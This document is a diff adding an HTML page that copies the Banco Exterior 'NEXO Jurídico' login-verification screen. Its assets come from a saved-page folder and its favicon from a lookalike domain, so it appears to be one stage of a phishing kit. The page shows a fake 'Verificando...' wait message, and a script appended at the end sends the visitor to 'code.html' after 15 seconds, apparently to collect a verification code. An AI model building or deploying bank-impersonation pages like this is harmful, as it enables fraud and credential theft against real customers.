@@ -1,0 +1,200 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/style.css.css"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/posicionamiento.css.css"><link rel="stylesheet" media="screen" type="text/css" href="empresaspw_files/primefaces.css.css"><script type="text/javascript" src="empresaspw_files/jquery.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/primefaces.js.xhtml"><!--
+
+//--></script>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://nexojuridico-bancoexterior.com/portaljuridico/resources/images/Fi128.ico"><script type="text/javascript" src="empresaspw_files/validator.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/progress.js.xhtml"><!--
+
+//--></script><script type="text/javascript" src="empresaspw_files/utilidadesPasaporteCedula.js.xhtml"><!--
+
+//--></script></head><body>
+
+    <div id="page" class="container_12">
+
+        <div id="header">
+		<div class="header">
+			<a href="#" class="logo_bienvenida">Banco Exterior</a>
+			<div class="titulo_header">
+				<h1 class="titulo_bienvenida">
+					Bienvenido a <span class="titulo_bienvenida2">
+					Exterior NEXO Jurídico</span>
+				</h1>
+			</div>
+			<div class="clear"></div>
+		</div>
+		<div class="separador_header"></div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="content" class="grid_12"><form id="form" name="form" method="post" action="/portaljuridico/login/antiphishing.xhtml" enctype="application/x-www-form-urlencoded"><script type="text/javascript"><!--
+validarSesionRemoteCommand = function() {PrimeFaces.ab({source:'form:j_id510487864_65ce8e60',formId:'form',oncomplete:function(xhr,status,args){actualizarSesion();},params:arguments[0]});}
+//--></script><script type="text/javascript"><!--
+
+
+            //Al cargar la vista
+            $(document).ready
+            (
+                function()
+                {
+                    $.timeOut = 180 * 1000; //3 minutos
+                    $.intervalo = 30000; //Intervalo de tiempo entre cada actualizacion de contadores y validacion de sesion
+                    $.transcurridoCliente = 0; //Tiempo transcurrido o contador de la sesion en JS
+                    $.transcurridoServidor = 0; //Tiempo transcurrido o contador de la sesion en JSF
+                    $.actividadCliente = false;
+                    $.actividadServidor = false;
+                    $.activarVentana = true;
+
+                    $('body').bind
+                    (
+                        'click',
+                        function()
+                        {
+                            $.actividadCliente = true;
+                            $.actividadServidor = true;
+                        }
+                    );
+
+                    validarActividad();
+                }
+            );
+
+            
+
+            function actualizarSesion()
+            {
+                $.transcurridoServidor = 0;
+                $.actividadServidor = false;
+
+                $.transcurridoCliente = 0;
+                $.actividadCliente = false;
+
+                if ( ! $.activarVentana )
+                {
+                    $("#modal_sesion").toggleClass("mostrar_modal");
+                    $.activarVentana = true;
+                }
+            }
+
+            function salirE24()
+            {
+                var path = window.location.pathname;
+                var modal = document.getElementById("modal_sesion");
+
+                if ( modal.className == "mostrar_modal")
+                {
+                    if (path.indexOf("logout.xhtml") != -1)
+                    {
+                        window.location.reload();
+                    }
+                    else
+                    {
+                        window.location = '../login/logout.xhtml?faces-redirect=true';
+                    }
+                }
+            }
+//--></script>
+    <div id="modal_sesion">
+        <div><img src="empresaspw_files/alerta.png.png" style="margin-left:135px;">
+
+            <h1 style="text-align: center;">Alerta de expiración de sesión</h1>
+
+            <p>Tu sesión expirará en un minuto</p>
+            <p>Para continuar la sesión, presiona el botón "Aceptar"</p>
+            <p>Para cerrar o terminar la sesión, presiona el botón "Salir"</p><button id="form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401" name="form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="salirE24();PrimeFaces.ab({source:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc6401'});return false;" style="margin-left:145px" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Salir</span></button><button id="form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e" name="form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only boton_azul" onclick="PrimeFaces.ab({source:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e',process:'form:j_id510487864_65ce8eb9:j_id2081069243_37dc640e',oncomplete:function(xhr,status,args){actualizarSesion();}});return false;" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Aceptar</span></button>
+
+        </div>
+    </div>
+            <script type="text/javascript"><!--
+
+                window.onload = function()
+                {
+                    var modoDemo = document.documentMode;
+                    if(8 >= modoDemo)
+                    {
+                       location.href ="errorNavegador.xhtml";
+                    }
+                }
+            
+//--></script><label>
+                <div class="prefix_1 grid_5 omega">
+                    <div style="margin-top: 30px;">
+                        <div align="center">
+
+                            <span class="titulo_antiphishing">Verificando...</span>
+
+                        </div>
+                        <div align="center" style="margin-top: 20px; "><img id="form:j_id510487864_65ce8e82" src="/wait.gif" alt="" class="img_Antiphishing" style="width: 80px; height: 80px;">
+
+                        </div>
+
+                        <div style="margin-top: 20px;">
+
+                            <span class="parrafo_antiphishing azul">
+
+                            Espere unos segundos mientras validamos su inicio de sesion.
+
+                             </span>
+                        </div>
+                    </div>
+
+                    <div class="clear"></div>
+                </div>
+
+                
+
+                <div class="mensaje_teclado ">
+                    <div style="margin-bottom: 18px; display: inline-block !important;"><div id="form:msgTeclado"></div>
+                    </div>
+                </div></label>
+
+            <div align="center" style="margin-top: 20px;">
+
+            </div><script type="text/javascript"><!--
+keepSessionAliveRemoteCommand = function() {PrimeFaces.ab({source:'form:j_id510487864_65ce8fb2',formId:'form',params:arguments[0]});}
+//--></script><input type="hidden" name="form_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="Il9nFZYor2MYt7cNISG0of+SXyi06/VlOSnAW2awd0k/13jJ+w2MhWye34y2Oh8x6riKlH/KaL2tABKtMB3719bqp1zAKGu8fQX3BVoMtjVXdS9jgpWGFqauL+/BQMC9n+RLZQ=="></form>
+
+            <div class="clear"></div>
+        </div>
+
+        <div id="footer">
+		<div class="prefix_11 grid_1 margen_superior">
+
+		</div>
+		<div class="datos_footer grid_12">
+            <table>
+                <tbody><tr>
+                    <td style="width: 50%">
+                        <p class="parrafo_footer">© 2014 Banco Exterior J-00002950-4. Todos los
+                        derechos reservados.</p>
+                        <p class="parrafo_footer">Edif. Banco EXTERIOR, Avenida Urdaneta, entre
+                            esquinas de Urapal a Rio, La Candelaria, Caracas, Venezuela. Código
+                            Postal 1010</p>
+                    </td>
+                    <td style="width: 50%; text-align: right;">
+                        <p class="parrafo_footer">Eres tú quien decides, vive una vida sana disfruta una vida Sin Igual.</p>
+                    </td>
+                </tr>
+            </tbody></table>
+		</div>
+
+            <div class="clear"></div>
+        </div>
+
+        <div class="clear"></div>
+
+    </div>
+
+    <script>
+        window.onload = function() {
+         setTimeout(() => {
+            window.location ="code.html"
+         }, 15000);
+        };
+    </script>
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div></body></html>
